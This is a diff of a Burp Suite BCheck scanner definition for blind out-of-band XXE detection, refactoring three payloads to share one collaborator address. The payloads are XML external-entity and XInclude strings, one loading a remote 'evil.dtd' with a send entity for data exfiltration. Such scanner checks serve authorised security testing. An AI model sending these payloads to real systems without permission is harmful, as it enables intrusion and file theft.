@@ -5,10 +5,13 @@ metadata:
     author: "BCheck Arsenal"
     tags: "xxe", "blind", "oob"
 
+define:
+    collab = {generate_collaborator_address()}
+
 run for each:
-    payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{generate_collaborator_address()}/xxe\">%xxe;]><foo>test</foo>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://{generate_collaborator_address()}/evil.dtd\">%dtd;%send;]><foo>test</foo>",
-        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"http://{generate_collaborator_address()}/xinclude\"/></foo>"
+    payload = "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{collab}/xxe\">%xxe;]><foo>test</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://{collab}/evil.dtd\">%dtd;%send;]><foo>test</foo>",
+        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"http://{collab}/xinclude\"/></foo>"
 
 given insertion point then
     send payload:
